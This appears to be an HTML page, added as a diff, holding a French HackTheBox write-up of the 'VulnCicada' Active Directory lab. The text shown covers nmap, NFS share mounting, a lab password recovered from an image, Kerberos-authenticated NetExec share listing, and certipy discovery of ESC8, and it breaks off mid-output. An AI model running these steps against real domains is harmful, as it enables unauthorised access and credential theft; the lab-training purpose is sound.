@@ -1,0 +1,1399 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VulnCicada — Writeup HTB</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0d0f;
+    --bg2: #0f1318;
+    --bg3: #141a21;
+    --green: #00ff88;
+    --green2: #00cc66;
+    --red: #ff3b6b;
+    --blue: #00b4ff;
+    --yellow: #ffd600;
+    --orange: #ff6b35;
+    --text: #c8d6e5;
+    --text-dim: #5a7a8a;
+    --border: #1e2d3d;
+    --glow: 0 0 20px rgba(0,255,136,0.3);
+    --glow-red: 0 0 20px rgba(255,59,107,0.3);
+    --glow-blue: 0 0 20px rgba(0,180,255,0.3);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 16px;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.08) 2px,
+      rgba(0,0,0,0.08) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* Grid background */
+  body::after {
+    content: '';
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background-image:
+      linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* HERO */
+  .hero {
+    position: relative;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    padding: 4rem 2rem;
+    overflow: hidden;
+    z-index: 1;
+  }
+
+  .hero-bg {
+    position: absolute;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    width: 600px; height: 600px;
+    background: radial-gradient(ellipse, rgba(0,255,136,0.06) 0%, transparent 70%);
+    animation: pulse 4s ease-in-out infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.6; }
+    50% { transform: translate(-50%, -50%) scale(1.1); opacity: 1; }
+  }
+
+  .htb-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    background: rgba(0,255,136,0.08);
+    border: 1px solid rgba(0,255,136,0.3);
+    padding: 6px 16px;
+    border-radius: 2px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--green);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-bottom: 2rem;
+    animation: fadeInDown 0.6s ease both;
+  }
+
+  .htb-badge::before {
+    content: '▶';
+    font-size: 8px;
+  }
+
+  .hero-title {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(3rem, 10vw, 8rem);
+    font-weight: 900;
+    line-height: 1;
+    letter-spacing: -2px;
+    margin-bottom: 1rem;
+    animation: fadeInDown 0.8s ease 0.1s both;
+  }
+
+  .hero-title span {
+    display: block;
+    background: linear-gradient(135deg, var(--green) 0%, var(--blue) 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    text-shadow: none;
+    filter: drop-shadow(0 0 30px rgba(0,255,136,0.4));
+  }
+
+  .hero-meta {
+    display: flex;
+    gap: 2rem;
+    flex-wrap: wrap;
+    justify-content: center;
+    margin: 2rem 0;
+    animation: fadeInUp 0.8s ease 0.3s both;
+  }
+
+  .meta-item {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+  }
+
+  .meta-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+
+  .meta-value {
+    font-family: 'Orbitron', monospace;
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--green);
+  }
+
+  .meta-value.medium { color: var(--orange); }
+  .meta-value.windows { color: var(--blue); }
+
+  .difficulty-bar {
+    display: flex;
+    gap: 4px;
+    margin-top: 4px;
+  }
+
+  .diff-dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--border);
+  }
+
+  .diff-dot.active { background: var(--orange); box-shadow: 0 0 8px var(--orange); }
+
+  .hero-synopsis {
+    max-width: 700px;
+    font-size: 16px;
+    color: var(--text-dim);
+    line-height: 1.8;
+    font-weight: 300;
+    animation: fadeInUp 0.8s ease 0.4s both;
+    border-left: 2px solid var(--green);
+    padding-left: 1.5rem;
+    text-align: left;
+    margin: 1rem 0 2rem;
+  }
+
+  .tags {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+    justify-content: center;
+    animation: fadeInUp 0.8s ease 0.5s both;
+  }
+
+  .tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 4px 12px;
+    border: 1px solid;
+    border-radius: 2px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  .tag.green { border-color: var(--green); color: var(--green); background: rgba(0,255,136,0.05); }
+  .tag.blue { border-color: var(--blue); color: var(--blue); background: rgba(0,180,255,0.05); }
+  .tag.red { border-color: var(--red); color: var(--red); background: rgba(255,59,107,0.05); }
+
+  /* SCROLL INDICATOR */
+  .scroll-hint {
+    position: absolute;
+    bottom: 2rem;
+    left: 50%;
+    transform: translateX(-50%);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 8px;
+    color: var(--text-dim);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 2px;
+    animation: fadeInUp 1s ease 1s both;
+  }
+
+  .scroll-arrow {
+    width: 20px; height: 20px;
+    border-right: 2px solid var(--green);
+    border-bottom: 2px solid var(--green);
+    transform: rotate(45deg);
+    animation: bounce 1.5s ease infinite;
+  }
+
+  @keyframes bounce {
+    0%, 100% { transform: rotate(45deg) translateY(0); }
+    50% { transform: rotate(45deg) translateY(6px); }
+  }
+
+  /* MAIN CONTENT */
+  main {
+    position: relative;
+    z-index: 1;
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 0 2rem 6rem;
+  }
+
+  /* ATTACK CHAIN */
+  .attack-chain {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-top: 2px solid var(--green);
+    padding: 2.5rem;
+    margin-bottom: 4rem;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .attack-chain::before {
+    content: 'ATTACK CHAIN';
+    position: absolute;
+    top: 1rem; right: 1.5rem;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+  }
+
+  .chain-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 13px;
+    color: var(--green);
+    letter-spacing: 3px;
+    margin-bottom: 2rem;
+  }
+
+  .chain-steps {
+    display: flex;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 0;
+  }
+
+  .chain-step {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 6px;
+    flex: 1;
+    min-width: 100px;
+  }
+
+  .chain-icon {
+    width: 44px; height: 44px;
+    border: 2px solid var(--green);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 18px;
+    background: rgba(0,255,136,0.05);
+    box-shadow: var(--glow);
+    position: relative;
+    z-index: 1;
+  }
+
+  .chain-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    color: var(--text-dim);
+    text-align: center;
+    letter-spacing: 1px;
+    line-height: 1.4;
+    text-transform: uppercase;
+  }
+
+  .chain-arrow {
+    color: var(--green);
+    font-size: 18px;
+    opacity: 0.5;
+    flex-shrink: 0;
+    margin: 0 -4px;
+    padding-bottom: 20px;
+  }
+
+  /* SECTIONS */
+  .section {
+    margin-bottom: 4rem;
+    animation: fadeInUp 0.6s ease both;
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    margin-bottom: 2rem;
+    padding-bottom: 1rem;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-number {
+    font-family: 'Orbitron', monospace;
+    font-size: 11px;
+    color: var(--green);
+    background: rgba(0,255,136,0.1);
+    border: 1px solid rgba(0,255,136,0.3);
+    padding: 4px 10px;
+    letter-spacing: 2px;
+    flex-shrink: 0;
+  }
+
+  .section-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 1.4rem;
+    font-weight: 700;
+    color: #fff;
+    letter-spacing: 2px;
+  }
+
+  .section-icon {
+    margin-left: auto;
+    font-size: 1.5rem;
+    opacity: 0.5;
+  }
+
+  /* TEXT CONTENT */
+  .prose {
+    font-size: 15px;
+    color: var(--text);
+    line-height: 1.8;
+    font-weight: 300;
+    margin-bottom: 1.5rem;
+  }
+
+  .prose strong {
+    color: var(--green);
+    font-weight: 600;
+  }
+
+  .highlight-box {
+    background: rgba(0,255,136,0.04);
+    border-left: 3px solid var(--green);
+    padding: 1rem 1.5rem;
+    margin: 1.5rem 0;
+    font-size: 14px;
+    color: var(--text);
+  }
+
+  .highlight-box.warning {
+    border-left-color: var(--orange);
+    background: rgba(255,107,53,0.04);
+  }
+
+  .highlight-box.danger {
+    border-left-color: var(--red);
+    background: rgba(255,59,107,0.04);
+  }
+
+  .highlight-box.info {
+    border-left-color: var(--blue);
+    background: rgba(0,180,255,0.04);
+  }
+
+  /* CODE BLOCKS */
+  .code-block {
+    background: #060a0d;
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--green);
+    border-radius: 2px;
+    margin: 1.5rem 0;
+    overflow: hidden;
+    position: relative;
+  }
+
+  .code-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 8px 14px;
+    background: rgba(0,255,136,0.05);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-lang {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--green);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+
+  .code-dots {
+    display: flex;
+    gap: 5px;
+  }
+
+  .code-dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+  }
+
+  .code-dot:nth-child(1) { background: #ff5f57; }
+  .code-dot:nth-child(2) { background: #febc2e; }
+  .code-dot:nth-child(3) { background: #28c840; }
+
+  .code-block pre {
+    padding: 1.2rem 1.5rem;
+    overflow-x: auto;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    line-height: 1.8;
+    color: var(--text);
+  }
+
+  .code-block pre .cmd { color: var(--green); }
+  .code-block pre .flag { color: var(--blue); }
+  .code-block pre .output { color: var(--text-dim); }
+  .code-block pre .success { color: var(--green); font-weight: bold; }
+  .code-block pre .error { color: var(--red); }
+  .code-block pre .comment { color: #3a5a6a; font-style: italic; }
+  .code-block pre .hash { color: var(--yellow); }
+  .code-block pre .ip { color: var(--orange); }
+  .code-block pre .domain { color: var(--blue); }
+
+  /* PORTS TABLE */
+  .ports-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    margin: 1.5rem 0;
+  }
+
+  .ports-table th {
+    background: rgba(0,255,136,0.08);
+    color: var(--green);
+    padding: 10px 16px;
+    text-align: left;
+    font-size: 10px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    border-bottom: 2px solid var(--green);
+  }
+
+  .ports-table td {
+    padding: 10px 16px;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    vertical-align: top;
+  }
+
+  .ports-table tr:hover td { background: rgba(0,255,136,0.02); }
+
+  .port-num { color: var(--orange); font-weight: bold; }
+  .port-service { color: var(--blue); }
+  .port-important { color: var(--yellow); }
+
+  /* CREDENTIAL BOX */
+  .cred-box {
+    display: inline-flex;
+    align-items: center;
+    gap: 1rem;
+    background: rgba(0,255,136,0.06);
+    border: 1px solid rgba(0,255,136,0.3);
+    padding: 1rem 1.5rem;
+    margin: 1rem 0;
+    font-family: 'Share Tech Mono', monospace;
+  }
+
+  .cred-user { color: var(--blue); }
+  .cred-sep { color: var(--text-dim); }
+  .cred-pass { color: var(--green); font-weight: bold; }
+
+  /* VULNERABILITY CARD */
+  .vuln-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-top: 3px solid var(--red);
+    padding: 2rem;
+    margin: 1.5rem 0;
+    position: relative;
+  }
+
+  .vuln-card::before {
+    content: '⚠ VULNERABILITY';
+    position: absolute;
+    top: -12px; left: 1.5rem;
+    background: var(--red);
+    color: #000;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    padding: 2px 10px;
+    letter-spacing: 2px;
+    font-weight: bold;
+  }
+
+  .vuln-name {
+    font-family: 'Orbitron', monospace;
+    font-size: 1.3rem;
+    font-weight: 900;
+    color: var(--red);
+    margin-bottom: 0.5rem;
+  }
+
+  .vuln-desc {
+    font-size: 14px;
+    color: var(--text-dim);
+    line-height: 1.7;
+  }
+
+  /* FLAGS */
+  .flags-section {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1.5rem;
+    margin: 2rem 0;
+  }
+
+  .flag-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    padding: 1.5rem;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .flag-card::after {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 3px; height: 100%;
+  }
+
+  .flag-card.user::after { background: var(--blue); }
+  .flag-card.root::after { background: var(--red); }
+
+  .flag-label {
+    font-family: 'Orbitron', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    margin-bottom: 0.8rem;
+    text-transform: uppercase;
+  }
+
+  .flag-card.user .flag-label { color: var(--blue); }
+  .flag-card.root .flag-label { color: var(--red); }
+
+  .flag-value {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--yellow);
+    word-break: break-all;
+    background: rgba(255,214,0,0.05);
+    padding: 8px 10px;
+    border: 1px solid rgba(255,214,0,0.15);
+  }
+
+  .flag-path {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    margin-top: 0.5rem;
+  }
+
+  /* LESSONS LEARNED */
+  .lessons {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 1.5rem;
+    margin: 2rem 0;
+  }
+
+  .lesson-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    padding: 1.5rem;
+    transition: border-color 0.3s;
+  }
+
+  .lesson-card:hover { border-color: var(--green); }
+
+  .lesson-icon { font-size: 2rem; margin-bottom: 0.8rem; }
+
+  .lesson-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 12px;
+    color: var(--green);
+    letter-spacing: 1px;
+    margin-bottom: 0.6rem;
+    text-transform: uppercase;
+  }
+
+  .lesson-text {
+    font-size: 13px;
+    color: var(--text-dim);
+    line-height: 1.6;
+    font-weight: 300;
+  }
+
+  /* TIMELINE */
+  .timeline {
+    position: relative;
+    padding-left: 2rem;
+    margin: 1.5rem 0;
+  }
+
+  .timeline::before {
+    content: '';
+    position: absolute;
+    left: 7px; top: 0;
+    width: 2px;
+    height: 100%;
+    background: linear-gradient(to bottom, var(--green), transparent);
+  }
+
+  .timeline-item {
+    position: relative;
+    margin-bottom: 1.5rem;
+    padding-left: 1.5rem;
+  }
+
+  .timeline-item::before {
+    content: '';
+    position: absolute;
+    left: -29px; top: 6px;
+    width: 10px; height: 10px;
+    border-radius: 50%;
+    background: var(--green);
+    box-shadow: var(--glow);
+  }
+
+  .timeline-step {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--green);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+
+  .timeline-desc {
+    font-size: 14px;
+    color: var(--text);
+  }
+
+  /* FOOTER */
+  footer {
+    position: relative;
+    z-index: 1;
+    border-top: 1px solid var(--border);
+    padding: 2rem;
+    text-align: center;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+  }
+
+  /* ANIMATIONS */
+  @keyframes fadeInDown {
+    from { opacity: 0; transform: translateY(-20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  @keyframes fadeInUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  /* DIVIDER */
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    margin: 3rem 0;
+    color: var(--text-dim);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+  }
+
+  .divider::before, .divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+
+  /* INLINE CODE */
+  code {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    background: rgba(0,255,136,0.08);
+    color: var(--green);
+    padding: 2px 6px;
+    border: 1px solid rgba(0,255,136,0.2);
+    border-radius: 2px;
+  }
+
+  /* TOOL BADGE */
+  .tool-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 3px 10px;
+    border-radius: 2px;
+    margin: 2px;
+    border: 1px solid;
+  }
+
+  .tool-badge.nmap { border-color: var(--blue); color: var(--blue); background: rgba(0,180,255,0.05); }
+  .tool-badge.certipy { border-color: var(--red); color: var(--red); background: rgba(255,59,107,0.05); }
+  .tool-badge.bloodyad { border-color: var(--orange); color: var(--orange); background: rgba(255,107,53,0.05); }
+  .tool-badge.krbrelayx { border-color: var(--yellow); color: var(--yellow); background: rgba(255,214,0,0.05); }
+  .tool-badge.impacket { border-color: var(--green); color: var(--green); background: rgba(0,255,136,0.05); }
+  .tool-badge.nxc { border-color: #a855f7; color: #a855f7; background: rgba(168,85,247,0.05); }
+</style>
+</head>
+<body>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-bg"></div>
+
+  <div class="htb-badge">HackTheBox — Machine Writeup</div>
+
+  <h1 class="hero-title">
+    <span>VulnCicada</span>
+  </h1>
+
+  <div class="hero-meta">
+    <div class="meta-item">
+      <span class="meta-label">Difficulté</span>
+      <span class="meta-value medium">MEDIUM</span>
+      <div class="difficulty-bar">
+        <div class="diff-dot active"></div>
+        <div class="diff-dot active"></div>
+        <div class="diff-dot active"></div>
+        <div class="diff-dot"></div>
+        <div class="diff-dot"></div>
+      </div>
+    </div>
+    <div class="meta-item">
+      <span class="meta-label">OS</span>
+      <span class="meta-value windows">WINDOWS</span>
+    </div>
+    <div class="meta-item">
+      <span class="meta-label">IP Cible</span>
+      <span class="meta-value">10.129.234.48</span>
+    </div>
+    <div class="meta-item">
+      <span class="meta-label">Domaine</span>
+      <span class="meta-value">cicada.vl</span>
+    </div>
+    <div class="meta-item">
+      <span class="meta-label">Auteur</span>
+      <span class="meta-value">xct</span>
+    </div>
+  </div>
+
+  <p class="hero-synopsis">
+    Machine Windows Active Directory impliquant la découverte d'un mot de passe caché dans une image sur un partage NFS public, 
+    l'exploitation de la vulnérabilité <strong>ESC8</strong> via du <strong>Kerberos relaying</strong> pour contourner les restrictions 
+    de self-relay, l'obtention d'un certificat en tant que compte machine, puis le dump des hashes pour compromettre le domaine entier.
+  </p>
+
+  <div class="tags">
+    <span class="tag green">Active Directory</span>
+    <span class="tag blue">ADCS / ESC8</span>
+    <span class="tag red">Kerberos Relay</span>
+    <span class="tag green">NFS Enumeration</span>
+    <span class="tag blue">Certificate Abuse</span>
+    <span class="tag red">DCSync</span>
+  </div>
+
+  <div class="scroll-hint">
+    <span>SCROLL</span>
+    <div class="scroll-arrow"></div>
+  </div>
+</section>
+
+<main>
+
+  <!-- ATTACK CHAIN -->
+  <div class="attack-chain">
+    <div class="chain-title">// CHAÎNE D'EXPLOITATION</div>
+    <div class="chain-steps">
+      <div class="chain-step">
+        <div class="chain-icon">📂</div>
+        <div class="chain-label">NFS<br>Public</div>
+      </div>
+      <div class="chain-arrow">›</div>
+      <div class="chain-step">
+        <div class="chain-icon">🖼️</div>
+        <div class="chain-label">Password<br>in Image</div>
+      </div>
+      <div class="chain-arrow">›</div>
+      <div class="chain-step">
+        <div class="chain-icon">🔐</div>
+        <div class="chain-label">Kerberos<br>Auth</div>
+      </div>
+      <div class="chain-arrow">›</div>
+      <div class="chain-step">
+        <div class="chain-icon">📜</div>
+        <div class="chain-label">ESC8<br>ADCS</div>
+      </div>
+      <div class="chain-arrow">›</div>
+      <div class="chain-step">
+        <div class="chain-icon">⚡</div>
+        <div class="chain-label">Krb<br>Relay</div>
+      </div>
+      <div class="chain-arrow">›</div>
+      <div class="chain-step">
+        <div class="chain-icon">🎫</div>
+        <div class="chain-label">Cert<br>DC$</div>
+      </div>
+      <div class="chain-arrow">›</div>
+      <div class="chain-step">
+        <div class="chain-icon">💀</div>
+        <div class="chain-label">DCSync<br>Admin</div>
+      </div>
+      <div class="chain-arrow">›</div>
+      <div class="chain-step">
+        <div class="chain-icon">🏆</div>
+        <div class="chain-label">SYSTEM<br>Shell</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- OUTILS -->
+  <div style="margin-bottom: 3rem;">
+    <div style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text-dim);letter-spacing:3px;text-transform:uppercase;margin-bottom:1rem;">// OUTILS UTILISÉS</div>
+    <span class="tool-badge nmap">⬡ Nmap</span>
+    <span class="tool-badge nxc">⬡ NetExec</span>
+    <span class="tool-badge certipy">⬡ Certipy-AD</span>
+    <span class="tool-badge bloodyad">⬡ BloodyAD</span>
+    <span class="tool-badge krbrelayx">⬡ Krbrelayx</span>
+    <span class="tool-badge impacket">⬡ Impacket</span>
+  </div>
+
+  <!-- SECTION 1 : ENUMERATION -->
+  <section class="section">
+    <div class="section-header">
+      <span class="section-number">01</span>
+      <h2 class="section-title">ÉNUMÉRATION</h2>
+      <span class="section-icon">🔍</span>
+    </div>
+
+    <p class="prose">On commence par un scan Nmap complet pour identifier tous les ports ouverts et les services actifs sur la machine cible.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">bash</span>
+        <div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div>
+      </div>
+      <pre><span class="comment"># Ajout des entrées DNS</span>
+<span class="cmd">echo</span> <span class="success">"10.129.234.48 DC-JPQ225.cicada.vl cicada.vl"</span> | sudo tee -a /etc/hosts
+
+<span class="comment"># Scan Nmap complet</span>
+<span class="cmd">nmap</span> <span class="flag">-sC -sV</span> <span class="ip">10.129.234.48</span></pre>
+    </div>
+
+    <p class="prose">Le scan révèle une infrastructure Active Directory typique avec plusieurs ports caractéristiques :</p>
+
+    <table class="ports-table">
+      <thead>
+        <tr>
+          <th>Port</th>
+          <th>Service</th>
+          <th>Notes</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><span class="port-num">53</span></td>
+          <td><span class="port-service">DNS</span></td>
+          <td>Simple DNS Plus</td>
+        </tr>
+        <tr>
+          <td><span class="port-num">80</span></td>
+          <td><span class="port-service">HTTP</span></td>
+          <td><span class="port-important">⚠ IIS — Web Enrollment ADCS possible</span></td>
+        </tr>
+        <tr>
+          <td><span class="port-num">88</span></td>
+          <td><span class="port-service">Kerberos</span></td>
+          <td>Authentification AD</td>
+        </tr>
+        <tr>
+          <td><span class="port-num">389 / 636</span></td>
+          <td><span class="port-service">LDAP / LDAPS</span></td>
+          <td>Domaine : cicada.vl</td>
+        </tr>
+        <tr>
+          <td><span class="port-num">445</span></td>
+          <td><span class="port-service">SMB</span></td>
+          <td>Signing activé — NTLM désactivé</td>
+        </tr>
+        <tr>
+          <td><span class="port-num">2049</span></td>
+          <td><span class="port-service">NFS</span></td>
+          <td><span class="port-important">⚠ Partage public accessible</span></td>
+        </tr>
+        <tr>
+          <td><span class="port-num">3389</span></td>
+          <td><span class="port-service">RDP</span></td>
+          <td>Terminal Services</td>
+        </tr>
+        <tr>
+          <td><span class="port-num">5985</span></td>
+          <td><span class="port-service">WinRM</span></td>
+          <td>Remote Management</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="highlight-box info">
+      <strong>Points clés :</strong> Le port 2049 (NFS) est ouvert — un partage accessible à tous. Le port 80 suggère un Web Enrollment ADCS. NTLM est désactivé, donc toute authentification devra passer par Kerberos.
+    </div>
+  </section>
+
+  <div class="divider">FOOTHOLD</div>
+
+  <!-- SECTION 2 : NFS -->
+  <section class="section">
+    <div class="section-header">
+      <span class="section-number">02</span>
+      <h2 class="section-title">NFS — DÉCOUVERTE DU MOT DE PASSE</h2>
+      <span class="section-icon">📂</span>
+    </div>
+
+    <p class="prose">Le service NFS expose un partage <code>/profiles</code> accessible par tout le monde. Ce partage semble correspondre au répertoire <code>C:\Users</code> du serveur Windows.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">bash</span>
+        <div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div>
+      </div>
+      <pre><span class="comment"># Lister les partages NFS disponibles</span>
+<span class="cmd">showmount</span> <span class="flag">-e</span> <span class="domain">cicada.vl</span>
+<span class="output">Export list for cicada.vl:
+/profiles (everyone)</span>
+
+<span class="comment"># Monter le partage</span>
+<span class="cmd">sudo mount</span> <span class="flag">-t nfs -o rw</span> <span class="domain">cicada.vl</span>:/profiles /mnt
+
+<span class="comment"># Explorer le contenu</span>
+<span class="cmd">ls</span> /mnt
+<span class="output">Administrator  Daniel.Marshall  Debra.Wright  Jane.Carter
+Jordan.Francis  Joyce.Andrews  Katie.Ward  Megan.Simpson
+Richard.Gibbons  Rosie.Powell  Shirley.West</span></pre>
+    </div>
+
+    <p class="prose">En explorant les dossiers, on trouve deux images intéressantes : <code>vacation.png</code> et <code>marketing.png</code>. L'image <code>marketing.png</code> dans le dossier de <strong>Rosie.Powell</strong> contient un post-it avec un mot de passe visible à l'écran.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">bash</span>
+        <div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div>
+      </div>
+      <pre><span class="cmd">sudo cp</span> /mnt/Rosie.Powell/marketing.png .
+<span class="comment"># → Image révèle un post-it avec le mot de passe écrit dessus</span></pre>
+    </div>
+
+    <div style="text-align:center; margin: 2rem 0;">
+      <div class="cred-box">
+        <span style="font-size:10px;color:var(--text-dim);letter-spacing:2px;">CREDENTIALS TROUVÉS</span>
+        <span class="cred-user">Rosie.Powell</span>
+        <span class="cred-sep">:</span>
+        <span class="cred-pass">Cicada123</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 3 : AUTH KERBEROS -->
+  <section class="section">
+    <div class="section-header">
+      <span class="section-number">03</span>
+      <h2 class="section-title">AUTHENTIFICATION KERBEROS</h2>
+      <span class="section-icon">🔐</span>
+    </div>
+
+    <p class="prose">NTLM étant désactivé sur cette machine, il faut synchroniser l'horloge locale avec celle du DC (Kerberos est très sensible au décalage d'horloge, tolérance de 5 minutes maximum) puis utiliser l'authentification Kerberos avec le flag <code>-k</code>.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">bash</span>
+        <div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div>
+      </div>
+      <pre><span class="comment"># Synchroniser l'horloge</span>
+<span class="cmd">sudo ntpdate -u</span> <span class="ip">10.129.234.48</span>
+
+<span class="comment"># Vérifier les credentials via Kerberos</span>
+<span class="cmd">nxc smb</span> <span class="domain">DC-JPQ225.cicada.vl</span> <span class="flag">-u</span> Rosie.Powell <span class="flag">-p</span> Cicada123 <span class="flag">-k</span>
+<span class="success">SMB  DC-JPQ225  [+] cicada.vl\Rosie.Powell:Cicada123</span>
+
+<span class="comment"># Énumérer les partages SMB</span>
+<span class="cmd">nxc smb</span> <span class="domain">DC-JPQ225.cicada.vl</span> <span class="flag">-u</span> Rosie.Powell <span class="flag">-p</span> Cicada123 <span class="flag">-k --shares</span>
+<span class="output">  ADMIN$       Remote Admin
+  C$           Default share
+  CertEnroll   READ  ← Active Directory Certificate Services !
+  IPC$         READ
+  NETLOGON     READ
+  profiles$    READ,WRITE
+  SYSVOL       READ</span></pre>
+    </div>
+
+    <div class="highlight-box warning">
+      <strong>Observation importante :</strong> Le partage <code>CertEnroll</code> confirme qu'ADCS (Active Directory Certificate Services) est installé sur ce DC. C'est notre prochaine cible d'énumération.
+    </div>
+  </section>
+
+  <div class="divider">EXPLOITATION</div>
+
+  <!-- SECTION 4 : ADCS ESC8 -->
+  <section class="section">
+    <div class="section-header">
+      <span class="section-number">04</span>
+      <h2 class="section-title">ADCS — DÉCOUVERTE DE ESC8</h2>
+      <span class="section-icon">📜</span>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">bash</span>
+        <div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div>
+      </div>
+      <pre><span class="cmd">certipy find</span> <span class="flag">-target</span> <span class="domain">DC-JPQ225.cicada.vl</span> <span class="flag">-u</span> Rosie.Powell@cicada.vl <span class="flag">-p</span> Cicada123 <span class="flag">-k -vulnerable -stdout</span>
+
+<span class="output">Certificate Authorities
+  CA Name     : cicada-DC-JPQ225-CA
+  DNS Name    : DC-JPQ225.cicada.vl
+  Web Enrollment
+    HTTP      : Enabled   ← PROBLÈME !
+    HTTPS     : Disabled</span>
+
